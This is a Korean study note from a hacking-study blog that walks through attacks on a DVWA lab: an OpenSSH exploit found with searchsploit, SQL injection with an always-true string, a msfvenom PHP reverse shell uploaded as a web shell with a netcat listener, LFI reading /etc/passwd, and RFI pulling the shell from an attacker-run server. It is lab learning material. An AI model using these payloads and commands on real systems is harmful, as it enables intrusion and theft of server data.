# No System Is Safe

> **원본 포스트 ID**: 32
> **발행일**: 2025-04-18 21:29:40
> **카테고리**: 해킹공부/웹해킹

## 📝 원문 내용

#### **복습하기**

저번에 했전 nmap 스캔결과을 파일안으로 집어넣기

![](./img/32_img.png)

![](./img/32_img_1.png)

무기 상점 방문 : searchsploit 그중에 openssh 공격해야하는 서버가 OpenSSH를 쓰기 때문에 

![](./img/32_img_2.png)

이런식으로 버전까지 적어주면 사용할수있는게 나옵니다

![](./img/32_img_3.png)

이제 저희는 command를 사용하고싶으니까 45001.py만을 찾으면 됩니다

![](./img/32_img_4.png) ![](./img/32_img_5.png) ![](./img/32_img_6.png)

이 파이썬 코드를 실행하면 공격가능

**구글 사용하기**

openssh 2.9p2 exploit 검색해도 공격가능

**SQL injection**

SQL 

Web Server DB server 연결해주는 언어

대표적인 SQL문

select * from member where id = 'psh'

아이디가 psh인 데이터를 가져오세요

SQL injection은 주입한다 사용자의 입력값은 id에 추가적인 명령어를 더하는것

예를들어 id = psh and id = 다른사람

이런식으로 모든사람의 데이터를 가져올수있음

**직접 실습해보기**

DVWA 실행

실행후 ip 검색

![](./img/32_img_7.png)

ip 주소 구글에 입력 

![](./img/32_img_8.png)

SQL Injection에 1적어보기

![](./img/32_img_9.png) select * from member where id = '1'

**저 id 부분에 1' or '1' = '1' 집어넣기**

select * from member where id = '1' or '1' = '1'   
  


or : 하나만 참이어도 참

알아야할 논리 연산

참 or 참 = 참

참 or 거짓 = 참

거짓 or 참 = 참

거짓 or 거짓 = 거짓

즉, 저 명령어는 모두가 참

1' or '1'='1 이거 집어넣기

''이 사이에 집어넣는거라서 생각하고 집어넣기

![](./img/32_img_10.png)

이와 같이 모든 데이터를 출력이 되는걸 알수있음 why? 항상 참인 조건을 넣어서

**웹 서버 장악하기 : Web Shell**

파일을 올리는 곳은 파일업로드 하는 web Shell 탈취

kali 웹에서 DVWA ip 주소 입력하기

![](./img/32_img_11.png)

파일 업로드로 들어가기

![](./img/32_img_12.png)

올릴파일 생성하기

![](./img/32_img_13.png) ![](./img/32_img_14.png)

파일 찾아서 올리기

![](./img/32_img_15.png)

URL뒤에 경로 붙여서 검색해보기

![](./img/32_img_16.png)

실행파일이다 싶으면 서버가 실행하고 응답해주는걸 알고있음 만약 악성스크립트를 삽입하고 업로드하면?

**shell 탈취방법 1 (업로드)**

**악성파일 만들기**
    
    
    msfvenom -p php/reverse_php LHOST=192.168.252.129 LPORT=7777 -f raw >shell.php

-p 는 악성 페이로드 리버스 쉘을 사용함 LHOST(lising host) 뒤는 칼리 ip주소 포트는 자기맘 출력방식은 raw

확인해보기

![](./img/32_img_17.png)
    
    
    nc -nlvp 7777

7777포트 열어주기

파일 업로드

![](./img/32_img_18.png)

이제 URL로 접속하고 포트연 터미널에서 ls 보기

![](./img/32_img_19.png) 파일 탐색 ![](./img/32_img_20.png) ip주소 ![](./img/32_img_21.png) 비밀번호

이런식으로 여러가지 명령어를 내릴수있음 

![](./img/32_img_22.png)

하지만 id를 보면 최고권한은 아님 즉,shell을 탈취해서 명령은 내릴수있지만 마음대로 주무르지 못함

권한상승은 이따가 올릴예정

**shell 탈취방법 2 (불러오기)**

**LEI (Local File Inclusion)**

File inclusion 들어가기 

![](./img/32_img_23.png)

URL include.php 자리에 저 명령어 넣기 
    
    
    /etc/passwd

![](./img/32_img_24.png)

계정정보 확인가능

이 방법으로 서버에있는 중요한정보들을 확인할수있음 (LFI로도 shell탈취가능)

**RFI (Renote File Inclusion)**

apache 실행하기

![](./img/32_img_25.png) ![](./img/32_img_26.png)

포트열려있는지 확인
    
    
    /var/www/html

이경로로 들어온뒤 파일 생성

![](./img/32_img_27.png)

여기서 pkexec명령어를 쓰는이유는 pkexec는 GUI 앱을 안전하게 root 권한으로 실행할 수 있게 도와주는 도구이기 때문

![](./img/32_img_28.png)

내용은 마음대로

이제 다시 돌아와서

URL에 http://ip주소/파일이름 을 치면 저런식으로 만들었던 Hello!!글자를 볼수있음

![](./img/32_img_29.png)

이제 본격적인 shell 탈취!!  
만들었던 shell.php 복붙

![](./img/32_img_30.png)

공격시작

![](./img/32_img_31.png)

포트열고 URL 경로에 shell.php 

![](./img/32_img_32.png)

shell 탈취 성공 하지만 www-data 권한 아직도 최고 권한이아님...

권한상승은 Post-Exploit 으로


## 🔗 제텔카스텐 연결

### 관련 개념
- [[]]
- [[]]

### 프로젝트 연결
- [[]]

### 학습 포인트
-

## 📋 액션 아이템
- [ ]
- [ ]

## 💡 개인적 통찰



---

**태그**: #해킹공부웹해킹
**상태**: 🌱 씨앗 (제텔카스텐 통합 대기)
**변환일**: 2025-10-07
